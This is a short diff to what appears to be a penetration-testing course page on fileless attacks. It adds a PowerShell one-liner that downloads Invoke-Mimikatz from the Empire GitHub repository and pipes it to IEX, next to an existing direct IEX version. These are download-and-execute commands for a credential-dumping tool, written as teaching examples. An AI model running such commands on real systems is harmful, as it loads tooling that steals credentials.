@@ -95,3 +95,9 @@ As we previously discussed, fileless attacks work by using some operating system
 ```powershell
 PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 ```
+`IEX` also accepts pipeline input.
+```powershell
+PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+```
+
+#### PowerShell Invoke-WebRequest
